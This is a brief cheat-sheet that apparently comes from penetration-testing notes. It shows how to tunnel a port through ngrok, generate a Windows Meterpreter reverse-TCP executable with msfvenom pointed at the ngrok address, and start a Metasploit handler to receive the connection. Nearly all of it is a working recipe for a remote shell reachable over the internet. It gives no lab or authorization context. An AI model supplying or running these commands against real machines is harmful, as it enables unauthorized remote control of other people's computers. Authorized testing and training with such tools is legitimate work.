# Ngrok - Port Forwarding

## Install Ngrok

[https://ngrok.com/](https://ngrok.com/)\
\
**Sign up and download for linux**

```
cd Downloads
	
mv ngrok-stable-linux-amd64.tgz /home/kali/Desktop
	
tar -xvf ngrok-stable-linux-amd64.tgz
	
./ngrok authtoken <auth token>
	
./ngrok help
	
./ngrok tcp 5555
```

#### Find the IP Address

```
host 0.tcp.ngrok.io
```

This IP address will be used as a locahost in payload creation

## Simple Payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ngrok ip> LPORT=<ngrok port> -f exe -o shell.exe
```

## Set Up Listener

```
msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 0.0.0.0   //means we are listening to any incoming connection

set LPORT 5555

run
```
